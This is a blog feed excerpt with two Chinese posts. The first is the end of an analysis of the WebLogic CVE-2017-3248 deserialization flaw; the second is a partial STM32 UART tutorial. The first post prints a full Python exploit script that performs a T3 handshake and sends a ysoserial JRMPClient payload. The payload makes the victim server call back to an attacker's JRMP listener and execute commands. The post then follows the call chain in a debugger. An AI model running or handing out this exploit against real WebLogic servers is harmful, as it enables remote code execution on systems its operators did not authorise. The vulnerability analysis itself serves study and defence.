&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210114035157541-743162254.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210114035211905-1081705998.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;执行完成后，JRMPClient的gadgets对象，通过T3协议发送给目标weblogic上，T3协议对其进行反序列化操作，反序列化JRMPClient的gadgets对象，weblogic会去请求JRMPListener，JRMPListener返回一个执行命令的gadgets对象，这里我们设置的是CC1执行的命令是创建一个文件。通过JRMP返回到weblogic后，也会进行反序列化操作。这时候命令就执行成功了。&lt;/p&gt;
&lt;p&gt;poc代码贴在下面&lt;/p&gt;
&lt;p&gt;POC.py:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;from __future__ import print_function

import binascii
import os
import socket
import sys
import time


def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    #generates ysoserial payload
    command = 'java -jar {} {} {}:{} &amp;gt; payload.out'.format(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)
    print(&quot;command: &quot; + command)
    os.system(command)
    bin_file = open('payload.out','rb').read()
    return binascii.hexlify(bin_file)


def t3_handshake(sock, server_addr):
    sock.connect(server_addr)
    sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
    time.sleep(1)
    sock.recv(1024)
    print('handshake successful')


def build_t3_request_object(sock, port):
    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
    data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport))
    data3 = '1a7727000d3234322e323134'
    data4 = '2e312e32353461863d1d0000000078'
    for d in [data1,data2,data3,data4]:
        sock.send(d.decode('hex'))
    time.sleep(2)
    print('send request payload successful,recv length:%d'%(len(sock.recv(2048))))


def send_payload_objdata(sock, data):
    payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
    payload+=data
    payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
    payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)
    sock.send(payload.decode('hex'))
    time.sleep(2)
    sock.send(payload.decode('hex'))
    res = ''
    try:
        while True:
            res += sock.recv(4096)
            time.sleep(0.1)
    except Exception:
        pass
    return res


def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(65)
    server_addr = (dip, dport)
    t3_handshake(sock, server_addr)
    build_t3_request_object(sock, dport)
    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
    print(&quot;payload: &quot; + payload)
    rs=send_payload_objdata(sock, payload)
    print('response: ' + rs)
    print('exploit completed!')


if __name__==&quot;__main__&quot;:
    #check for args, print usage if incorrect
    if len(sys.argv) != 7:
        print('\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] '
              '[JRMPListener ip] [JRMPListener port] [JRMPClient]\n')
        sys.exit()

    dip = sys.argv[1]
    dport = int(sys.argv[2])
    path_ysoserial = sys.argv[3]
    jrmp_listener_ip = sys.argv[4]
    jrmp_listener_port = sys.argv[5]
    jrmp_client = sys.argv[6]
    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h3&gt;
&lt;p&gt;下面来对该漏洞进行分析。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210114035243376-1499901513.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在断点处会获取到传递过来的对象名，这里的对象并不在黑名单内，后面这里判断如果为黑名单的话就会直接抛出异常。&lt;/p&gt;
&lt;p&gt;后面执行到下一步到了这里&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210114035254784-597212390.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;而下一步则是调用父类的&lt;code&gt;resolveClass&lt;/code&gt;方法。&lt;/p&gt;
&lt;p&gt;下面有些地方跟踪不了，可能是版本没调对，这里用了1.6和1.8的版本。在&lt;code&gt;org.apache.commons.collections.functors#transform&lt;/code&gt;方法，先个断点查看执行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210114035310817-1259878144.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;调用栈往下走就可以看到具体的调用流程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210114035324927-1271374549.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里就是我们的weblogic T3协议传递过来的数据进行反序列化操作的位置。再从这个点往上走，发现这里调用了RemoteObject的readObject方法，这里对readObject进行了重写。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210114035347914-1906107919.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再从调用栈往上看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210114035356922-505029601.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;发现上面执行到了&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;的&lt;code&gt;readObject&lt;/code&gt;方法，那就说明前面这段是&lt;code&gt;JRMPClient&lt;/code&gt;的gadget对象进行反序列化，并且接收&lt;code&gt;JRMPJRMPListener&lt;/code&gt;返回的请求然后进行反序列化的操作。而&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;重写了&lt;code&gt;readObject&lt;/code&gt;则是会走到&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;的&lt;code&gt;readObject&lt;/code&gt;这一步。其中的步骤被简略了。&lt;/p&gt;
&lt;p&gt;到了这里自然就不用说了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210114035406209-928980597.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;走到这一步进行命令执行操作。&lt;/p&gt;
&lt;h2 id=&quot;0x03-结尾&quot;&gt;0x03 结尾&lt;/h2&gt;
&lt;p&gt;到了这里其实就已经结尾了，但是会发现很多点都没去进行分析，而只是一味的写了利用点。因为在此对JRMP的模块执行和RMI的底层不太了解，在这里不敢妄下定论，个人认为该漏洞的重点也在这两个知识点中。所以到这里就潦草的结尾了，后面再去对这两个知识点去做详细分析。看到有位师傅的文章分析挺详细，在这里贴出来膜拜一波&lt;a href=&quot;https://www.anquanke.com/post/id/225137#h3-3&quot; target=&quot;_blank&quot;&gt;CVE-2017-3248——WebLogic反序列化初探&lt;/a&gt;。&lt;/p&gt;
</description>
<pubDate>Wed, 13 Jan 2021 19:54:00 +0000</pubDate>
<dc:creator>nice_0e3</dc:creator>
<og:description>Java 安全之Weblogic 2017-3248分析 0x00 前言 在开头先来谈谈前面的绕过方式，前面的绕过方式分别使用了streamMessageImpl 和MarshalledObject对</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/nice0e3/p/14275298.html</dc:identifier>
</item>
<item>
<title>STM32 HAL库之串口详细篇 - 东小东</title>
<link>http://www.cnblogs.com/dongxiaodong/p/14275284.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/dongxiaodong/p/14275284.html</guid>
<description>&lt;h2&gt;一、基础认识&lt;/h2&gt;
&lt;h3&gt;(一) 并行通信&lt;/h3&gt;
&lt;p&gt;原理：数据的各个位同时传输&lt;/p&gt;
&lt;p&gt;优点：速度快&lt;/p&gt;
&lt;p&gt;缺点：占用引脚资源多，通常工作时有多条数据线进行数据传输&lt;/p&gt;
&lt;p&gt;8bit数据传输典型连接图：&lt;/p&gt;
&lt;p&gt;传输的数据是二进制：11101010，则通信使用8条线同时进行数据传输，发送端一次性发送8位数据，接收端一次性接收8位数据。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020502046-791945883.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;(二) 串行通信&lt;/h3&gt;
&lt;p&gt;原理：数据按位顺序传输&lt;/p&gt;
&lt;p&gt;优点：占用引脚资源少&lt;/p&gt;
&lt;p&gt;缺点：速度相对较慢，通常工作时只有一条数据线进行数据传输&lt;/p&gt;
&lt;p&gt;8bit数据传输典型连接图：&lt;/p&gt;
&lt;p&gt;传输的数据是二进制：11101010，则通信使用8条线同时进行数据传输，发送端一次性发送8位数据，接收端一次性接收8位数据。&lt;/p&gt;
&lt;p&gt;8bit数据传输典型连接图：&lt;/p&gt;
&lt;p&gt;传输的数据是二进制：11101010，则通信使用1条线进行数据传输，发送端一次性发送1位数据，接收端一次性接收1位数据。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020534275-366375335.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;串行通信的分类：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.单工：数据只能在一个方向上传输，通信双方数据只能由一方传输到另一方&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020549789-2049166106.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2.半双工：数据可以错时双向传输，通信双方数据可以支持两个方向传输，但是同一时间只能由一方传输到另外一方。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020627746-992141657.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3.全双工：数据可以同时双向传输，通信双方数据可以同时进行双向传输，对于其中一个设备来说，设备需要支持发送数据时可以进行数据接收。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020650599-37064033.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;串行通信的通讯方式：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;l  同步通信：带时钟同步信号的传输，如SPI、IIC、USART（同步）&lt;/p&gt;
&lt;p&gt;l  异步通信：不带时钟同步信号的传输，如UART、USART（异步）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;常见数据传输协议：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020704042-1902646807.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;(三)   UART和USART&lt;/h3&gt;
&lt;p&gt;UART：通用异步收发器&lt;/p&gt;
&lt;p&gt;USART：通用同步/异步收发器，其可选使用异步方式，那将和UART无区别，如果是同步，则需要多一根时钟线（USART_CK）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020725698-1564107074.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;(四)  STM32的USART注意：&lt;/h3&gt;
&lt;p&gt;l  通常USART1接口的通信速率较快，其它USART接口较慢。如STM32F103C8T6的USART1接口通信速率是4.5Mbps,其它USART接口的通信速率是2.25Mbps。&lt;/p&gt;
&lt;p&gt;l  片上所有的USART接口都可以使用DMA操作&lt;/p&gt;
&lt;p&gt;l  USART的扩展及距离：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020751736-1061044243.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;UART和COM是物理接口形式（物理接口）&lt;/p&gt;
&lt;p&gt;TTL和RS-232是电平标准（电信号）&lt;/p&gt;
&lt;p&gt;串口接收：&lt;/p&gt;
&lt;p&gt;l  扫描模式&lt;/p&gt;
&lt;p&gt;l  中断模式&lt;/p&gt;
&lt;p&gt;l  DMA模式&lt;/p&gt;
&lt;h2&gt;&lt;span lang=&quot;EN-US&quot;&gt;二、串口基础配置&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020842309-1274700114.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;模式选择：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Asynchronous  异步通信&lt;/p&gt;
&lt;p&gt;Synchronous  同步通信&lt;/p&gt;
&lt;p&gt;Single Wire (Half-Duplex) 单线/半双工&lt;/p&gt;
&lt;p&gt;Multiprocessor Communication 多处理器&lt;/p&gt;
&lt;p&gt;支持局域互连网络LIN、智能卡(SmartCard)协议与lrDA(红外线数据协会) SIR ENDEC规范。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020901650-561133580.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;默认的TX GPIO：&lt;/p&gt;
&lt;p&gt;l  模式为：推挽式复用功能&lt;/p&gt;
&lt;p&gt;l  输出速率：高速&lt;/p&gt;

&lt;p&gt;默认的RX GPIO：&lt;/p&gt;
&lt;p&gt;l  模式为：浮空输入&lt;/p&gt;
&lt;p&gt;参数设置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020918333-437903747.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;l  &lt;strong&gt;Baud Rate&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;任意设置，未做限制，输入框&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020935685-1078757244.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt; &lt;/p&gt;
&lt;p&gt;l  &lt;strong&gt;Word Length&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;数据位可选8位或9位&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114020948007-1323538591.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;l  &lt;strong&gt;Parity&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;校验位可选无校验（None）、偶校验（Even）、奇校验（Odd）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114021001754-711346332.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;l  &lt;strong&gt;Stop Bits&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;停止位可选1位、2位&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114021012859-515137520.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;l  &lt;strong&gt;Data Direction&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;数据方向，可选收发（Receive and Transmit）、只接收（Receive Only）、只发送（Transmit Only）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114021100309-1570398388.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;三、阻塞发送函数&lt;/h2&gt;
&lt;p&gt;以阻塞模式发送大量数据&lt;/p&gt;
&lt;p&gt;当没有启用UART奇偶校验( PCE sign0 )，并且单词长度配置为9位( m1 - m0 sign01 )时，*发送的数据作为一组U16处理。在9位/无奇偶校验传输的情况下，pData需要作为uint16_t指针处理&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
HAL_StatusTypeDef HAL_UART_Transmit(UART_HandleTypeDef *huart, uint8_t *pData, uint16_t Size, uint32_t Timeout);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;huart: 指向uart _ handletypedef结构的huart指针，该结构包含指定uart模块的配置信息。&lt;/p&gt;
&lt;p&gt;PData: 指向数据缓冲区的pData指针(U8或u16数据元素)。&lt;/p&gt;
&lt;p&gt;Size: 要发送的数据元素( u8或U16 )的大小&lt;/p&gt;
&lt;p&gt;Timeout：超时持续时间，单位ms，0就是0ms超时，数据最大发送时间，超过则返回异常&lt;/p&gt;
&lt;p&gt;返回：&lt;/p&gt;
&lt;p&gt;HAL 状态&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
typedef &lt;span&gt;enum&lt;/span&gt;&lt;span&gt;
{
  HAL_OK       &lt;/span&gt;= &lt;span&gt;0x00U&lt;/span&gt;&lt;span&gt;,
  HAL_ERROR    &lt;/span&gt;= &lt;span&gt;0x01U&lt;/span&gt;&lt;span&gt;,
  HAL_BUSY     &lt;/span&gt;= &lt;span&gt;0x02U&lt;/span&gt;&lt;span&gt;,
  HAL_TIMEOUT  &lt;/span&gt;= &lt;span&gt;0x03U&lt;/span&gt;&lt;span&gt;
} HAL_StatusTypeDef;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;例如：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
HAL_UART_Transmit(&amp;amp;huart1,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;dongxiaodong\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,strlen(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;dongxiaodong\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;),&lt;span&gt;0xFFFF&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;span lang=&quot;EN-US&quot;&gt;四、串口扫描接收&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;（一）相关函数&lt;/h3&gt;
&lt;p&gt;l  &lt;strong&gt;阻塞接收函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在阻塞模式下接收大量数据。&lt;/p&gt;
&lt;p&gt;当没有启用UART奇偶校验( PCE sign0 )，并且单词长度配置为9位( m1 - m0 sign01 )时，*接收到的数据作为一组U16处理。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
HAL_StatusTypeDef HAL_UART_Receive(UART_HandleTypeDef *huart, uint8_t *pData, uint16_t Size, uint32_t Timeout);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;huart: 指向uart _ handletypedef结构的huart指针，该结构包含指定uart模块的配置信息。&lt;/p&gt;
&lt;p&gt;pData：指向数据缓冲区的指针( u8或U16数据元素)。&lt;/p&gt;
&lt;p&gt;Size: 要接收的数据元素数量( u8或U16 )。&lt;/p&gt;
&lt;p&gt;Timeout:超时持续时间，单位ms，0就是0ms超时，数据接收最大等待时间，超出则异常&lt;/p&gt;
&lt;p&gt;返回：&lt;/p&gt;
&lt;p&gt;HAL 状态&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
typedef &lt;span&gt;enum&lt;/span&gt;&lt;span&gt;
{
  HAL_OK       &lt;/span&gt;= &lt;span&gt;0x00U&lt;/span&gt;&lt;span&gt;,
  HAL_ERROR    &lt;/span&gt;= &lt;span&gt;0x01U&lt;/span&gt;&lt;span&gt;,
  HAL_BUSY     &lt;/span&gt;= &lt;span&gt;0x02U&lt;/span&gt;&lt;span&gt;,
  HAL_TIMEOUT  &lt;/span&gt;= &lt;span&gt;0x03U&lt;/span&gt;&lt;span&gt;
} HAL_StatusTypeDef;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
uint8_t data=&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
{
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(HAL_UART_Receive(&amp;amp;huart1,&amp;amp;data,&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;0&lt;/span&gt;)==&lt;span&gt;HAL_OK){

    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span lang=&quot;EN-US&quot;&gt;（二）代码实现&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
HAL_UART_Transmit(&amp;amp;huart1,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;dongxiaodong\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,strlen(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;dongxiaodong\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;),&lt;span&gt;0xFFFF&lt;/span&gt;&lt;span&gt;);
uint8_t data&lt;/span&gt;=&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;串口接收数据&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;(HAL_UART_Receive(&amp;amp;huart1,&amp;amp;data,&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;0&lt;/span&gt;)==&lt;span&gt;HAL_OK){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将接收的数据发送&lt;/span&gt;
             HAL_UART_Transmit(&amp;amp;huart1,&amp;amp;data,&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
        }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中timeout为0表示没有延时，所以串口接收函数是不阻塞的，while循环将一直轮询&lt;/p&gt;
&lt;p&gt;加个延时函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114021506246-1245471663.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这样一来的话，接收数据就异常了，会接收数据不全，所以这样是不可靠的&lt;/p&gt;
&lt;p&gt;那改成这样呢？&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
uint8_t data[&lt;span&gt;100&lt;/span&gt;]={&lt;span&gt;0&lt;/span&gt;&lt;span&gt;};
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(HAL_UART_Receive(&amp;amp;huart1,data,&lt;span&gt;100&lt;/span&gt;,&lt;span&gt;1000&lt;/span&gt;)==&lt;span&gt;HAL_OK){
            
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;接收100个数据，等待时间为1秒，这样的话接收区没满时，每次运行这条语句都要延时等待1S，这时相当于一个HAL_Dealy(1000)，这会阻塞while循环。只有数据接收到刚刚等于100才能返回HAL_OK，所以不能用于接收变成数据，这是不理想的。&lt;/p&gt;
&lt;h2&gt;&lt;span lang=&quot;EN-US&quot;&gt;五、 串口中断接收&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span lang=&quot;EN-US&quot;&gt;（一）&lt;span lang=&quot;EN-US&quot;&gt;cubemx设置&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;使能串口中断&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114021559489-532156138.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;优先级选择&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114021613154-581252970.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Preemption Priorit：抢占优先级&lt;/p&gt;
&lt;p&gt;Sub Priority ：子优先级&lt;/p&gt;
&lt;p&gt;数字越小优先级越高&lt;/p&gt;
